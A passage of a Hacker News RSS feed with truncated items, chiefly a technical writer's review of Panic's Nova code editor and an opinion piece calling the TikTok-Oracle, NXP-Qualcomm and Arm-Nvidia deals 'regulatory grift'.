        </item>
        <item>
            <title>
<![CDATA[Panic's Nova text editor (a review)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511824">thread link</a>) | @zdw
<br/>
September 17, 2020 | https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review | <a href="https://web.archive.org/web/*/https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpanic.com&amp;t=NjBmZGVhMjgyZDBmOWY3MTAyODFjYWE2MjgwM2FiMWRkNjdkMGYxNSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">Panic</a>, the long-established makers of Mac utility software, seems fully aware that introducing a new, commercial code editor in 2020 is a quixotic proposition. Is there enough of an advantage to a native editor over both old school cross-platform editors like Emacs and explosively popular new editors like <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fcode.visualstudio.com&amp;t=NTRiY2ZkZGE3M2MwZjRmMTQ3NWIxYWI2N2MxNmU5MmM3N2RiNmFlNSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">Visual Studio Code</a> to persuade people to switch?</p><p>I‚Äôm an unusual case as far as text editor users go: my primary job is technical writing, and the last three jobs that I‚Äôve worked at have a ‚Äúdocs as code‚Äù approach, where we write documentation in Markdown and manage it under version control just like source code. The editor that works best for me in tech writing is the venerable <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.barebones.com%2Fproducts%2Fbbedit%2Findex.html&amp;t=NWM2OGYwZThkNGYzMDFmYzdmYWZmNGEyZWRlZDA4OGIzMGZkZjRmMyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">BBEdit</a>. When it comes to editing <em>code,</em> though, BBEdit lags behind. My suspicion is that BBEdit‚Äôs lack of an integrated package manager has hurt it here. Also, BBEdit‚Äôs language modules don‚Äôt support extending one another, making it effectively impossible to do full highlighting for a templating language like <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Freactjs.org%2Fdocs%2Fintroducing-jsx.html&amp;t=YTMxZjkzMTBiNjhiMjYzM2M0MzA1MDM2Mjc1YTlhM2Y5ZWNiYzJiMixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">JSX</a> or <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpalletsprojects.com%2Fp%2Fjinja%2F&amp;t=NzRkZWViMTM1OTU0MTA5Yzc3Nzc2NjFiYzVjNDAwYmY3MGI3OWM4ZixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">Jinja</a>.</p><p>When I was a web programmer, I was one of many who moved to <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmacromates.com%2F&amp;t=YjMyZDMxMzQ0YzFjNDljMThlZWM5ZjNhY2M2NmY5YjJmM2E3NTUxZCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">TextMate</a>, and used it for everything for a while. When the Godot-like wait for TextMate 2.0 became unbearable, I wandered the text editing wilderness, eventually splitting my loyalties between BBEdit, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.sublimetext.com%2F&amp;t=MDIzZTVlY2RjMTk5N2M2OWYxZjBjODAzMDZiOWZmM2U2ZjRjNDEzZCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">Sublime Text</a>, and more recently VS Code. At this point, I suspect nothing will pull me away from BBEdit for technical writing, but for programming I‚Äôm open to persuasion.</p><h2 id="so-meet-nova">So: meet Nova.</h2><figure data-orig-height="2096" data-orig-width="2192" data-orig-src="https://micro.coyotetracks.org/uploads/2020/0d33432bcb.png"><img src="https://64.media.tumblr.com/71bc06b690da9776b15d551318a514f0/d722421a61f4e9d6-93/s1280x1920/fb42d548cc1d17dee9a5c099241dfa4bbf6e83e0.png" alt="A screenshot of Nova's main window, showing its sidebar and a Ruby file." title="nova-main-window-2x.png" width="1096" height="1048" data-orig-height="2096" data-orig-width="2192" data-orig-src="https://micro.coyotetracks.org/uploads/2020/0d33432bcb.png"></figure><p>I‚Äôve been using Nova off and on in beta for months. I‚Äôve reported some bugs, although I may mention a couple here that I didn‚Äôt catch until after 1.0‚Äôs release. And, I‚Äôm going to compare it to the GUI editors that I‚Äôve been using recently: BBEdit, Sublime Text, and VS Code.</p><p>Nova is a <em>pretty</em> editor, as far as such things go, and with files of relatively reasonable size it‚Äôs fast. With stupid huge files its performance drops noticeably, though. This isn‚Äôt just the ridiculous 109MB, nearly 450,000-line SQL file I threw at it once, it‚Äôs also with a merely 2MB, 50,000-line SQL file, and Nova‚Äôs offer to turn off syntax highlighting in both files didn‚Äôt help it much. This may sound like a silly test, but in my day job I‚Äôm occasionally stuck editing an 80,000-line JSON file by hand (don‚Äôt ask). This is something BBEdit and VS Code can do without complaint. Panic wrote their own text editing engine for Nova, which is brave, but it needs more tuning for pathological cases like these. They may not come up often, but almost every programmer has <em>one</em> stupid huge file to deal with.</p><p>Nova has an integrated terminal <em>and</em> an integrated SSH client, and even an integrated file transfer system based on Panic‚Äôs <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.panic.com%2Ftransmit%2F&amp;t=ZDJlMmFmYjU4MWRkMDU5MzNkOGJjNGRhZWMxN2MyNmY3MTQ5Njc2ZixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">Transmit</a>. In fact, if you have Transmit and use <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpanic.com%2Fsync%2F&amp;t=ZDdhNjdmMmM0MzQ5YThkMmM5YzNmZjc4YjVlODZjYzZlN2ZhZGIyNixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">Panic Sync</a>, it knows all of those servers out of the box. Nova has a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flibrary.panic.com%2Fnova%2Frun-tasks%2F&amp;t=MmMyOTdmMWExNjkxNDE2Nzk0ZmYzNDJmMWMzMDg1YTE0OTZhZDdmNCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">task workflow system</a> for automating building and running. You can associated servers, tasks, and more with individual projects; Nova‚Äôs project settings are considerably more comprehensive than I‚Äôve seen in other editors. You can even set up <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flibrary.panic.com%2Fnova%2Fremote-tasks%2F&amp;t=MjVkOGY0ZmMwYjllYmM0ODk1ZmM3NWUyYmEwYjBjZGM0NGVhN2IzMSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">remote tasks</a>. Nova has a serviceable Git client built in, too. Like VS Code, Nova uses JavaScript for its extension API, and it has built-in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmicrosoft.github.io%2Flanguage-server-protocol%2F&amp;t=OTkyZGY0ZDM3ZjU4NjU3NGIyNjQ0Mzg0OGJmN2M4YjNmYTNjNzdkNixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">Language Server Protocol</a> support‚Äîit‚Äôs a superbly solid foundation.</p><p>Beyond that, some smaller features have become table stakes for modern GUI editors, and Nova handles them with aplomb. ‚ÄúOpen Quickly‚Äù can jump to any file in the open project, as well as search by symbols or just symbols in currently open files; it has a command palette; you can comprehensively edit keybindings. It has multiple cursor support for those of us who like that, and a ‚Äúmini map‚Äù view for those of you who like that, although know that you are wrong. Nova‚Äôs selection features include ‚ÄúSelect all in scope‚Äù and ‚ÄúSelect all between brackets,‚Äù a command I often use in BBEdit and miss dearly in Code. (Both Nova and BBEdit select between brackets and braces, although BBEdit also selects between parentheses.) This effectively becomes ‚ÄúSelect between tags‚Äù in HTML, a nice touch. There are a few other commands like ‚ÄúSelect all in function‚Äù and ‚ÄúSelect all in scope‚Äù that I didn‚Äôt have any luck in making work at all; a little more documentation would be nice.</p><p>That‚Äôs worth an aside. Panic has created a ‚Äúlibrary‚Äù of tech note-style articles about Nova sorted by publication date rather than an actual manual, and it‚Äôs not always easy to find the information you want in it. I know this is just what a technical writer would say, but I‚Äôd dearly like to see a human-organized table of contents starting with the editor basics and moving to advanced topics like version control, server publishing and extension authoring.</p><h3 id="the-zen-of-language-servers">The Zen of Language Servers</h3><p>A lot of Visual Studio Code‚Äôs smarts depend on the implementation of a ‚Äúlanguage server‚Äù behind the scenes: language servers offer almost spookily intelligent completion. For instance, take this PHP snippet:</p><pre><code>if ($allowed) {
    $response = new Response(405);
    $response-&gt;
</code></pre><p>If you have the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fbmewburn%2Fvscode-intelephense&amp;t=NmQ3YTIyY2UwYjdhZTU4YjNiNzVlY2MyZGVjM2U3ZjZjZGI5ODRiYixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">Intelephense</a> PHP language server plugin, Code understands that <code>$response</code> is an instance of <code>Response</code> and, after you type the <code>&gt;</code> above, offers completions of method names from the <code>Response</code> class.</p><p>Right now, Nova‚Äôs mostly limited to the language servers Panic provides, and they‚Äôre‚Ä¶ not always so smart. In that snippet above, Nova starts by offering completions of, apparently, <em>everything</em> in the open project, starting with the variables. If I type ‚Äús,‚Äù it narrows things down to methods that begin with ‚Äús,‚Äù but it‚Äôs <em>all</em> methods that start with ‚Äús‚Äù rather than just the methods from <code>Response</code>. The ‚ÄúJump to Definition‚Äù command shows a similar lack of context; if I highlight a method name that‚Äôs defined in multiple places, Nova shows me a popup menu and prompts me to choose which one to jump to, rather than introspecting the code to make that decision itself.</p><p>But, this is a solvable problem: there‚Äôs (I think) no reason someone couldn‚Äôt write an Inteliphense plugin for Nova. If Nova‚Äôs ecosystem takes off, it could be pretty formidable pretty quickly.</p><h2 id="walk-like-a-mac">Walk like a Mac</h2><p>Even so, LSP support isn‚Äôt Panic‚Äôs biggest selling point. Unlike Sublime Text or VS Code, Nova isn‚Äôt cross-platform: it‚Äôs a Mac-only program written to core platform APIs. Is that still a huge draw in 2020? (Is it instead a drawback?)</p><p>You can definitely see a difference between Nova and BBEdit on one side and Sublime and Code on the other in terms of resource usage. With the two Ruby files shown in the screenshot above loaded, I get:</p><ul><li>VS Code: 355 MB, 6 processes</li><li>Sublime Text: 338 MB, 2 processes</li><li>Nova: 101 MB, 2 processes</li><li>BBEdit: 97 MB, 1 process</li></ul><p>Code is an Electron-based program, although Microsoft famously puts a lot of effort into making it not feel like the black hole a lot of Electron-based apps are. Sublime uses its own proprietary cross-platform framework. In fairness, while us nerds like to harp on research usage a lot, if your computer‚Äôs got 16G or more of RAM in it, this probably isn‚Äôt a big deal.</p><p>You notice Nova‚Äôs essential Mac-ness in other ways. Its preference pane is, like BBEdit‚Äôs, an actual preference pane, instead of opening in another tab like Code or just opening a JSON file in a new tab (!) like Sublime. And while all editors better have first-class keyboard support‚Äîand Nova does‚Äîa good Mac editor should have first-class <em>mouse</em> support, too, and it does. You notice that in the drag-and-drop support for creating new tabs and splits. Nova‚Äôs sidebar is also highly customizable, possibly more so than any editor I‚Äôve regularly used. (Yes, Emacs fans, I know you can write all of Nova in Lisp if you want. When one of you does that, please get back to me.)</p><p>Unlike BBEdit, though, Nova doesn‚Äôt have a Mac-like title bar, or a Mac-like outline view of the project files, or Mac-like tabs. (Well, BBEdit doesn‚Äôt have tabs at all, which turns out to be a great UI decision once you have a dozen or more files open, but never mind.) This isn‚Äôt necessarily bad; people often say BBEdit ‚Äúlooks old,‚Äù and it‚Äôs hard not to suspect that what people mean by that‚Äîwhether or not they know it‚Äîis that it looks like the long-established Mac program it is. Nova is relying less on ‚Äúwe have a Mac UI and the other guys don‚Äôt‚Äù than on ‚Äúwe have Panic‚Äôs designers and the other guys don‚Äôt.‚Äù Make no mistake, having Panic‚Äôs designers counts for a lot.</p><p>What may be more disappointing to old school Mac nerds is AppleScript support: none whatsoever. It doesn‚Äôt even have a vestigial script dictionary. Again, this may not be something most people care much about; personally, I <em>hate</em> having to write AppleScript. But I love being <em>able</em> to write AppleScript. BBEdit‚Äôs extensive scriptability is one of its hidden strengths. Nova‚Äôs Node-based JavaScript engine is probably more powerful for its own extensions and certainly more accessible to anyone under the age of 50, but it may be hard to call it from external programs.</p><h2 id="so-is-it-worth-it">So is it worth it?</h2><p>That probably depends on where you‚Äôre coming from.</p><p>If you loved‚Äîor still use‚ÄîPanic‚Äôs older editor, Coda, this is a no-brainer upgrade. If you used <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.espressoapp.com&amp;t=MmMxMWFhZWM5MzU4NTIwMDQ4NDRmNDBlYWFmYjIwYzAwZmQxZTMxNyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600676746">Espresso</a>, a Coda-ish editor that always seemed to be on the verge of greatness without ever reaching it, Nova may also be a no-brainer for you.</p><p>If you‚Äôre a fan of Sublime Text, BBEdit, TextMate, or another editor that doesn‚Äôt have native Language Server Protocol support, you should definitely <em>try</em> Nova. Sublime and TextMate have more plugins (especially Sublime), but many extensions seem to be languishing (especially TextMate). BBEdit never had a great extension ecosystem to start with. All of these editors have strengths Nova doesn‚Äôt, but the reverse is also true, and Nova may catch up.</p><p>If you‚Äôre an Emacs or Vim power user, we both know you‚Äôre just reading this out of academic interest and you‚Äôre not going to switch. C‚Äômon.</p><p>If you use Visual Studio Code, though, it‚Äôs way tougher to make the case for Nova. Code has a <em>vastly</em> larger extension library. It has the best support for LSP of any editor out there (LSP was developed <em>for</em> Code). Despite being ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review">https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review</a></em></p>]]>
            </description>
            <link>https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511824</guid>
            <pubDate>Fri, 18 Sep 2020 00:54:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Era of Regulatory Grift: TikTok-Oracle, NXP-Qualcomm, Arm-Nvidia]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511748">thread link</a>) | @ceohockey60
<br/>
September 17, 2020 | https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>The dictionary definition of the word ‚Äúgrift‚Äù is as follows: ‚Äú<a href="https://www.merriam-webster.com/dictionary/grift">to acquire money or property illicitly</a>‚Äù. It may be a strong word, but also more or less encapsulates the regulatory ethos that‚Äôs governing cross-border technology businesses these days.</p><p>The TikTok-Oracle deal flaunts this grifting ethos, but it‚Äôs just the latest example of a series of haphazard regulatory actions mired in geopolitical brinkmanship -- a trend that may implicate deals with much larger impact, like the pending Nvidia acquisition of Arm.</p><h2 id="tiktok-oracle">TikTok-Oracle</h2><p>There are still many missing details to the TikTok-Oracle deal, and Trump <a href="https://uk.reuters.com/article/us-usa-tiktok-oracle/trump-raises-questions-about-tiktok-oracle-deal-if-bytedance-ties-remain-idUKKBN2672KD">may not approve the deal</a>. But in the grand scheme of things, many of these details are no longer important, because the spirit of the entire TikTok ‚Äúsoap opera‚Äù is cemented: a <strong>regulatory grift </strong>by the Trump administration that enriches its political donor (Larry Ellison), strengthens its campaign message (anti-China, job creation), while doing next to nothing to protect Americans from either intrusive data collection or foreign influence.</p><p>Let‚Äôs look at each of these malfeasances.</p><p><strong><em>What Oracle gets.</em></strong> TikTok‚Äôs immediate business value accrues to Oracle Cloud to the tune of possibly <a href="https://www.theinformation.com/articles/with-tiktok-deal-oracle-could-gain-billion-dollar-cloud-customer?utm_content=article-4850&amp;utm_campaign=article_email&amp;utm_source=sg&amp;utm_medium=email">$1 billion in annual revenue</a> in the coming years, as it desperately tries to catch up to AWS and Azure. The Oracle brand may also get a boost from this young, cool consumer product, even though Oracle has no experience running such a product. Since I‚Äôve written in detail about TikTok‚Äôs business value in ‚Äú<a href="https://interconnected.blog/what-is-tiktok-worth-to-whom-and-why/"><strong>What is TikTok Worth to Whom and Why?</strong></a>‚Äù, I won‚Äôt repeat myself here. <strong>One element I did not discuss so explicitly is how valuable TikTok‚Äôs user data is to the Oracle data broker business.</strong></p><p>In a nutshell, a data broker sells data to third parties mostly for marketing or advertisement purposes. Oracle‚Äôs data broker businesses are euphemistically called <a href="https://www.oracle.com/cx/marketing/">Oracle CX Marketing</a> and <a href="https://www.oracle.com/data-cloud/">Oracle Data Cloud</a>. Having the treasure trove of data that TikTok has already collected is perhaps an even more immediate business boost to Oracle than getting the product‚Äôs workload onto its cloud. Ironically (or perhaps appropriately), the person who called out the privacy violations of data brokers like Oracle, Equifax, and others is <a href="https://www.linkedin.com/in/michael-beckerman-9b750a58/"><strong>Michael Berkerman</strong></a><strong>, who is currently TikTok US‚Äôs Head of Public Policy</strong>. He did so last year as the then President and CEO of the Internet Association in <a href="https://www.foxnews.com/opinion/michael-beckerman-why-do-we-need-a-federal-privacy-law-ask-the-data-brokers-selling-your-private-information">an OpEd published on Fox News</a> -- a ‚Äúmedia‚Äù outlet that the President of the United States most certainly pays attention to. I wonder how long Berkerman will be sticking around, if at all, after the TikTok-Oracle deal closes.</p><p>Lastly, Oracle will likely get a <a href="https://www.ft.com/content/58eb7c26-2154-477f-af19-19157ae29261">minority stake in TikTok</a> with ByteDance still being the majority shareholder. This piece of equity in one of the most valuable private tech companies in the world -- trading at a $140 billion valuation in the secondary market earlier this year -- is something that Oracle would have no business getting in a normal investing situation. Not a bad deal <a href="https://www.businessinsider.com/oracle-billionaire-larry-ellison-is-fundraising-for-donald-trump-2020-2">for hosting a single fundraiser</a>.</p><p><strong><em>What the Trump campaign gets.</em> </strong>Being more ‚Äúanti-China‚Äù than Biden and going after the Vice President‚Äôs son‚Äôs business dealings in China has been a messaging tentpole of the Trump re-election campaign. It can now claim credit for acting tough and forcing a marquee Chinese tech company to ‚Äúsurrender‚Äù its crown jewel product to America, while accomplishing none of those things, because TikTok‚Äôs core technology is staying with ByteDance in China.</p><p>The Oracle bid also apparently includes a ‚Äú<strong>20,000 new jobs‚Äù </strong>commitment -- a typical public relations promise with no legally binding effect. Being ‚Äúanti‚Äù-China while ‚Äúcreating‚Äù jobs is a strong one-two punch as we approach the final stretch of the 2020 election season, so much so that Secretary Mnuchin couldn't wait to sell the 20,000 jobs message on CNBC the day after Oracle‚Äôs winning bid was made public, <em>even though</em> the deal hasn‚Äôt been approved or finalized yet.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/ZPRPswu2Cyc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>TikTok US‚Äôs current payroll is about 1,400 people. <strong>That would be an almost 20x increase in headcount.</strong> Theoretically possible? Sure. Practical and sensible? Hardly.</p><p><em><strong>What the American people get.</strong> </em>Nothing, except that they still get to watch cool dance videos and <a href="https://www.tiktok.com/@rosssmith/video/6797540353730743557">grandmas do this</a> on their phones. We have no new information or answer to any of the three legitimate concerns surrounding TikTok:</p><ul><li>Does it send data to China?</li><li>Is its user data collection practices proper?</li><li>Is it being used as a tool for foreign influence?</li></ul><p>To be clear, there <em>are</em> regulatory tools based on technology at our disposal to answer these questions, <strong>with or without Oracle</strong>. I‚Äôve laid them out in detail in ‚Äú<a href="https://interconnected.blog/a-framework-to-dis-trust-and-verify-tiktok/"><strong>A Framework to (Dis)trust and Verify TikTok</strong></a>‚Äù. Unfortunately, it‚Äôs clear as day that the Trump administration is only interested in the political messaging benefits of TikTok-Oracle, not doing the actual work that is required to protect the interests of the American people.</p><p><strong>There is another winner that we should all take note of: <em>Chinese regulators.</em></strong></p><p>Chinese regulators typically use their power to force technology and IP transfers from foreign entities to domestic companies via joint-ventures or outright acquisitions -- <strong>another form of regulatory grift</strong>. This TikTok-Oracle deal is the first time to my knowledge, where Chinese regulators use their power to protect a home-grown technology from being <em>transferred out</em> to a foreign entity.</p><p>This win has just as much to do with exerting their regulatory power as the sucker on the other side of the negotiation table. This dynamic isn‚Äôt new, if we look at the failed NXP-Qualcomm acquisition in 2018.</p><h2 id="nxp-qualcomm">NXP-Qualcomm</h2><p>Qualcomm‚Äôs attempt to buy the Dutch semiconductor maker, NXP, for $44 billion was abandoned, because it could not get approval from Chinese regulators. This occurred during the previous height of tension when the U.S. and China were tossing retaliatory trade tariffs at each other like a couple of teenage boys in a backyard snowball fight.</p><p>The Chinese regulators did not disapprove of the deal and asked for changes to gain approval, which would‚Äôve been a good faith move. <strong>They just ignored it and let the deadline pass.</strong> This is after Secretary Mnuchin and his Commerce Department counterpart, Wilbur Ross, lobbied the Chinese Vice Minister, Liu He, and Ambassador to the US, Cui Tiankai, to approve the deal. The backdrop of this lobbying was Trump easing the penalties on the Chinese telecom equipment maker, ZTE, for violating U.S. sanction rules with regard to Iran and North Korea -- hoping for some reciprocity and dealmaking.</p><p>This foolish hope did not pan out. Instead, Qualcomm, America‚Äôs national champion in the race to 5G, had to fork up a <a href="https://www.wsj.com/articles/qualcomm-plans-to-abandon-nxp-deal-1532549728">$2 billion cancellation fee to NXP and increase its stock buyback program from $10 to $30 billion</a> to appease its shareholders. What‚Äôs more, this turn of events showed Chinese regulators that given the <strong>interconnected nature of the global economy</strong>, particularly technology businesses, they have far-reaching authority and leverage to shape deals, events, and technology acquisition vis-a-vis <strong>a tough-talking, weak-acting </strong>Trump administration. It is a key reversal in fortune, when a large swath of China‚Äôs technology sector, particularly Huawei, has been hammered by U.S. sanctions.</p><p>Qualcomm-NXP was a defensive play -- not approving a deal. TikTok-Oracle is a proactive play -- not losing control of domestic technology. <strong>There‚Äôs now an opportunity for even more aggressive ‚Äúregulatory grift‚Äù: Arm-Nvidia.</strong></p><h2 id="arm-nvidia">Arm-Nvidia</h2><p>It‚Äôs hard to comprehend the long-term impact that Nvidia‚Äôs $40 billion acquisition of Arm will have on the future of technology. One thing is certain though: it‚Äôs way more important than TikTok and Oracle, separately and combined.</p><p>We shouldn‚Äôt assume the Arm-Nvidia deal will be closed as expected given all the corporate governance issues with Arm‚Äôs China operation. Arm China‚Äôs CEO, Allen Wu, has been fired by the board for various acts of conflicts of interest and double dealing, <a href="https://www.zdnet.com/article/arms-fired-china-jv-head-refuses-to-leave-company-reps-banned-from-company-premises/">yet refuses to leave</a>. Arm‚Äôs CEO, Simon Segars, is trying to assure the public that the mess <a href="https://www.yicaiglobal.com/news/chip-designer-arm-to-solve-chinese-jv-management-issue-before-nvidia-buyout">will be cleaned up </a>in order to not endanger the sale, but he‚Äôs not in a position of leverage, now that the deal is public and the expectations are high. (Nvidia‚Äôs market cap increased by $17.5 billion the day after the deal was announced.)</p><p>Furthermore, the Arm China division is a joint-venture where 51% of the entity is owned by a consortium of these three funds:</p><ul><li><a href="https://en.wikipedia.org/wiki/China_Investment_Corporation">China Investment Corporation</a> (China‚Äôs sovereign wealth fund)</li><li><a href="https://en.wikipedia.org/wiki/Silk_Road_Fund">Silk Road Fund</a> (a state-owned fund focused on projects related to the Belt &amp; Road Initiative)</li><li><a href="https://en.wikipedia.org/wiki/Temasek_Holdings">Temasek Holding</a> (Singapore‚Äôs sovereign wealth fund)</li></ul><p>The other 49% is owned by Softbank via Arm. The joint venture structure is par for the course for any foreign technology company doing business in China. But such a tight ownership by state-owned funds means Chinese regulators (and Singaporean regulators for that matter) have strong jurisdictional power over the deal from the get-go. NXP-Qualcomm‚Äôs legal hook was a tenuous nexus. TikTok-Oracle‚Äôs hook was established by <a href="https://en.pingwest.com/a/7657">an eleventh hour change</a> to the government‚Äôs technology ‚Äúentity list‚Äù. Arm-Nvidia doesn‚Äôt need any extra work for regulators to aggressively insert themselves into the picture.</p><p>What will the Chinese regulators do is hard to tell at this moment. However, given the fact that Arm‚Äôs chip design IP has a 95% global market share in mobile devices and is <a href="https://www.zdnet.com/article/aws-graviton2-what-it-means-for-arm-in-the-data-center-cloud-enterprise-aws/">making inroads into cloud data centers</a> as well, <strong>it‚Äôs likely that China will either veto the deal (like NXP-Qualcomm) or try to keep any semiconductor IP that Arm China has even a tangential connection to</strong>. Some Chinese tech media <a href="https://mp.weixin.qq.com/s/W8nhj6udDTdr54ui7_0RIQ">are already speculating about a veto</a>. Using this opportunity to acquire some key technology also makes sense, because by <em>not</em> doing so, China runs the monumental risk of having the entire Arm ecosystem be subject to U.S. sanctions after it becomes a property of Nvidia. An ‚Äú<strong>Arm sanction</strong>‚Äù would cripple China‚Äôs entire mobile technology sector, where domestic chip design options barely exist and the open source option, RISC-V, still ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/">https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/</a></em></p>]]>
            </description>
            <link>https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511748</guid>
            <pubDate>Fri, 18 Sep 2020 00:44:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced Rest Client (ARC) ‚Äì Free and open source API testing tool]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511697">thread link</a>) | @gilad
<br/>
September 17, 2020 | https://install.advancedrestclient.com/install | <a href="https://web.archive.org/web/*/https://install.advancedrestclient.com/install">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://install.advancedrestclient.com/install</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511697</guid>
            <pubDate>Fri, 18 Sep 2020 00:37:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CCP announces plan to take control of China's private sector]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24511672">thread link</a>) | @apsec112
<br/>
September 17, 2020 | https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector | <a href="https://web.archive.org/web/*/https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        
        
      
